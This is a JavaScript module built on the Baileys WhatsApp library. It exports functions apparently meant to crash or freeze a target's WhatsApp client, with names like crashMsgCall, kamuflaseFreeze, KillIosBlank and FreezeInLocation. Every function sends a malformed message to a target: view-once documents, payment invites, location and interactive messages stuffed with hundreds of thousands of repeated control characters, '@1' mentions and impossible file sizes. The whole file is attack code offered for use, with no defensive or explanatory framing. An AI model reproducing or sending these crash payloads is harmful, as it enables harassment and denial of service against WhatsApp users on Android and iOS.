const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    makeCacheableSignalKeyStore,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    getDevice,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
} = require('@adiwajshing/baileys')
async function crashMsgCall(conn, target) {
  conn.relayMessage(target, {
    viewOnceMessage: {
        message: {
            interactiveMessage: {
                header: {
                    documentMessage: {
                        url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                        mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                        fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                        fileLength: "999999999",
                        pageCount: 0x9184e729fff,
                        mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                        fileName: "DeAD CoDe",
                        fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                        directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                        mediaKeyTimestamp: "1715880173",
                        contactVcard: true
                    },
                    title: "DeAD",
                    hasMediaAttachment: true
                },
                body: {
                    text: "CoDe"
                },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: 'call_permission_request',
                            buttonParamsJson: '{}'
                        }
                    ]
                },
                contextInfo: {
                    quotedMessage: {
                        interactiveResponseMessage: {
                            body: { 
                                text: "Sent", 
                                format: "DEFAULT" 
                            },
                            nativeFlowResponseMessage: {
                                name: "galaxy_message",
                                paramsJson: `{
                                    "screen_2_OptIn_0": true,
                                    "screen_2_OptIn_1": true,
                                    "screen_1_Dropdown_0": "Gabimaru OfficiaL",
                                    "screen_1_DatePicker_1": "1028995200000",
                                    "screen_1_TextInput_2": "Gabimaru@gmail.com",
                                    "screen_1_TextInput_3": "94643116",
                                    "screen_0_TextInput_0": "radio - buttons${"\u0003".repeat(1020000)}",
                                    "screen_0_TextInput_1": "Why?",
                                    "screen_0_Dropdown_2": "001-Grimgar",
                                    "screen_0_RadioButtonsGroup_3": "0_true",
                                    "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                }`,
                                version: 3
                            }
                        }
                    }
                }
            }
        }
    }
}, { participant: { jid: target } }, { messageId: null });
}

async function kamuflaseFreeze(conn, target) {
    let messagePayload = {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {},
                        hasMediaAttachment: false
                    },
                    body: {
                        text: "ṚẍḧḶ ÖḟḟïċïäḶ ☠️"
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "review_and_pay",
                                buttonParamsJson: JSON.stringify({
                                    currency: "IDR",
                                    total_amount: { value: 6100, offset: 100 },
                                    reference_id: "4Q79X9PCBEM",
                                    type: "physical-goods",
                                    order: {
                                        status: "completed",
                                        subtotal: { value: 0, offset: 100 },
                                        order_type: "PAYMENT_REQUEST",
                                        items: [
                                            {
                                                retailer_id: "custom-item-7fca9870-8e3a-4a4a-bfb7-8a07fbf5fa9e",
                                                name: "@1".repeat(70000),
                                                amount: { value: 6100, offset: 100 },
                                                quantity: 1
                                            }
                                        ]
                                    },
                                    additional_note: "ṚẍḧḶ ÖḟḟïċïäḶ ☠️",
                                    native_payment_methods: [],
                                    share_payment_status: false
                                })
                            }
                        ]
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [
                            {
                                groupJid: "1@newsletter",
                                groupSubject: "Ǥαвιмαяʋ"
                            }
                        ],
                        isForwarded: true,
                        quotedMessage: {
                            interactiveResponseMessage: {
                                body: {
                                    text: "Sent",
                                    format: "DEFAULT"
                                },
                                nativeFlowResponseMessage: {
                                    name: "galaxy_message",
                                    paramsJson: `{
                                        "screen_2_OptIn_0": true,
                                        "screen_2_OptIn_1": true,
                                        "screen_1_Dropdown_0": "Ǥαвιмαяʋ OfficiaL",
                                        "screen_1_DatePicker_1": "1028995200000",
                                        "screen_1_TextInput_2": "Ǥαвιмαяʋ@gmail.com",
                                        "screen_1_TextInput_3": "94643116",
                                        "screen_0_TextInput_0": "radio - buttons${"\u0003".repeat(900000)}",
                                        "screen_0_TextInput_1": "Why?",
                                        "screen_0_Dropdown_2": "001-Grimgar",
                                        "screen_0_RadioButtonsGroup_3": "0_true",
                                        "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                    }`,
                                    version: 3
                                }
                            }
                        }
                    }
                }
            }
        }
    };

conn.relayMessage(target, messagePayload, { participant: { jid: target } }, { messageId: null });
}

async function systemUi(conn, target) {
    conn.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "DeAD" + "ꦾ".repeat(250000) + "@1".repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "CoDe" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
};

async function freezeInDocument(conn, target) {
    conn.relayMessage(
        target,
        {
            viewOnceMessage: {
                message: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/pdf",
                        fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                        fileLength: "1991837291999",
                        pageCount: 199183729199991,
                        mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                        fileName: "Ǥαвιмαяʋ OfficiaL",
                        fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                        directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1728631701",
                        contactVcard: true,
                        caption: "゙゙゙゙゙゙".repeat(100) + "@1".repeat(90000),
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Ǥαвιмαяʋ" }],
                            isForwarded: true,
                            quotedMessage: {
                                interactiveResponseMessage: {
                                    body: { 
                                        text: "Sent", 
                                        format: "DEFAULT" 
                                    },
                                    nativeFlowResponseMessage: {
                                        name: "galaxy_message",
                                        paramsJson: `{
                                            "screen_2_OptIn_0": true,
                                            "screen_2_OptIn_1": true,
                                            "screen_1_Dropdown_0": "Ǥαвιмαяʋ OfficiaL",
                                            "screen_1_DatePicker_1": "1028995200000",
                                            "screen_1_TextInput_2": "Ǥαвιмαяʋ@gmail.com",
                                            "screen_1_TextInput_3": "94643116",
                                            "screen_0_TextInput_0": "radio - buttons${"\u0003".repeat(700000)}",
                                            "screen_0_TextInput_1": "Why?",
                                            "screen_0_Dropdown_2": "001-Grimgar",
                                            "screen_0_RadioButtonsGroup_3": "0_true",
                                            "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                        }`,
                                        version: 3
                                    },
                                }
                            }
                        }
                    }
                }
            }
        },
        { participant: { jid: target } }
    );
}

async function travaIos(conn, target) {
    await conn.relayMessage(
        target,
        {
            paymentInviteMessage: {
                serviceType: "FBPAY",
                expiryTimestamp: Date.now() + 1814400000
            }
        },
        {
            participant: {
                jid: target
            }
        }
    );
};

async function travaIosKill(conn, target) {
    await conn.relayMessage(
        target,
        {
            paymentInviteMessage: {
                serviceType: "UPI",
                expiryTimestamp: Date.now() + 1814400000
            }
        },
        {
            participant: {
                jid: target
            }
        }
    );
};

async function KillIosBlank(conn, target) {
   let TravaIphone = "𑇂𑆵𑆴𑆿".repeat(60000)
    await conn.relayMessage(
        target,
        {
            locationMessage: {
                degreesLatitude: 173.282,
                degreesLongitude: -19.378,
                name: "😘" + TravaIphone,
                url: "https://youtube.com/@Ǥαвιмαяʋofc"
            }
        },
        {}
    );
};

async function carouselCrashMsg(conn, target) {
    conn.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "ṚẍḧḶ ÖḟḟïċïäḶ ☠️" + "ꦾ".repeat(120000) + "@1".repeat(250000)
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "Ǥαвιмαяʋ OfficiaL"
                    },
                    carouselMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Ǥαвιмαяʋ" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
};

async function callXgalaxy(conn, target) {
  conn.relayMessage(target, {
    viewOnceMessage: {
        message: {
            interactiveMessage: {
                header: {
                    documentMessage: {
                        url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                        mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                        fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                        fileLength: "999999999",
                        pageCount: 0x9184e729fff,
                        mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                        fileName: "DeAD CoDe",
                        fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                        directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                        mediaKeyTimestamp: "1715880173",
                        contactVcard: true
                    },
                    title: "",
                    hasMediaAttachment: true
                },
                body: {
                    text: ""
                },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: 'call_permission_request',
                            buttonParamsJson: '{}'
                        }
                    ]
                },
                contextInfo: {
                    quotedMessage: {
                        interactiveResponseMessage: {
                            body: { 
                                text: "Sent", 
                                format: "DEFAULT" 
                            },
                            nativeFlowResponseMessage: {
                                name: "galaxy_message",
                                paramsJson: `{
                                    "screen_2_OptIn_0": true,
                                    "screen_2_OptIn_1": true,
                                    "screen_1_Dropdown_0": "DeAD CoDe",
                                    "screen_1_DatePicker_1": "1028995200000",
                                    "screen_1_TextInput_2": "mark@startech.id",
                                    "screen_1_TextInput_3": "94643116",
                                    "screen_0_TextInput_0": "radio - buttons${"\u0003".repeat(1020000)}",
                                    "screen_0_TextInput_1": "Why?",
                                    "screen_0_Dropdown_2": "001-Grimgar",
                                    "screen_0_RadioButtonsGroup_3": "0_true",
                                    "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                }`,
                                version: 3
                            }
                        }
                    }
                }
            }
        }
    }
}, { participant: { jid: target } }, { messageId: null });
}

async function GalaxyInDocument(conn, target) {
    conn.relayMessage(target,
        {
            viewOnceMessage: {
                message: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0&mms3=true",
                        mimetype: "application/pdf",
                        fileSha256: "cZMerKZPh6fg4lyBttYoehUH1L8sFUhbPFLJ5XgV69g=",
                        fileLength: "1991837291999",
                        pageCount: 199183729199991,
                        mediaKey: "eKiOcej1Be4JMjWvKXXsJq/mepEA0JSyE0O3HyvwnLM=",
                        fileName: "DeAD CoDe",
                        fileEncSha256: "6AdQdzdDBsRndPWKB5V5TX7TA5nnhJc7eD+zwVkoPkc=",
                        directPath: "/v/t62.7119-24/17615580_512547225008137_199003966689316810_n.enc?ccb=11-4&oh=01_Q5AaIEi9HTJmmnGCegq8puAV0l7MHByYNJF775zR2CQY4FTn&oe=67305EC1&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1728631701",
                        contactVcard: true,
                        caption: "゙゙゙゙゙゙".repeat(100) + "@1".repeat(90000),
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "DeAD" }],
                            isForwarded: true,
                            quotedMessage: {
                                interactiveResponseMessage: {
                                    body: { 
                                        text: "Sent", 
                                        format: "DEFAULT" 
                                    },
                                    nativeFlowResponseMessage: {
                                        name: "galaxy_message",
                                        paramsJson: `{
                                            "screen_2_OptIn_0": true,
                                            "screen_2_OptIn_1": true,
                                            "screen_1_Dropdown_0": "DeAD CoDe",
                                            "screen_1_DatePicker_1": "1028995200000",
                                            "screen_1_TextInput_2": "mark@startech.id",
                                            "screen_1_TextInput_3": "94643116",
                                            "screen_0_TextInput_0": "radio - buttons${"\u0003".repeat(1020000)}",
                                            "screen_0_TextInput_1": "Why?",
                                            "screen_0_Dropdown_2": "001-Grimgar",
                                            "screen_0_RadioButtonsGroup_3": "0_true",
                                            "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
                                        }`,
                                        version: 3
                                    },
                                }
                            }
                        }
                    }
                }
            }
        },
        { participant: { jid: target } }
    );
}

async function FreezeInLocation(conn, target) {

    conn.relayMessage(target, {

        groupMentionedMessage: {

            message: {

                interactiveMessage: {

                    header: {

                        locationMessage: {

                            degreesLatitude: 0,

                            degreesLongitude: 0

                        },

                        hasMediaAttachment: true

                    },

                    body: {

                        text: "DeaD_CoDe\n" + "\u0000".repeat(25000) + "ꦾ".repeat(25000) +  "@1".repeat(400000)

                    },

                    nativeFlowMessage: {},

                    contextInfo: {

                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),

                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "None" }]

                    }

                }

            }

        }

    }, { participant: { jid: target } }, { messageId: null });
};

async function iosaph(conn, target) {
    await conn.relayMessage(
        target, {
                'paymentInviteMessage': {
                    'serviceType': "UPI",
                    'serviceType': "FBPAY",
                    'serviceType': "yarn_info",
                    'serviceType': "PENDING",
                    'expiryTimestamp': Date.now() + 1814400000
                }
            }, {
                'participant': {
                    'jid': target
                }
            });
        }


module.exports = { crashMsgCall, kamuflaseFreeze, systemUi, freezeInDocument, travaIos, travaIosKill, KillIosBlank, carouselCrashMsg, callXgalaxy, GalaxyInDocument, FreezeInLocation, iosaph }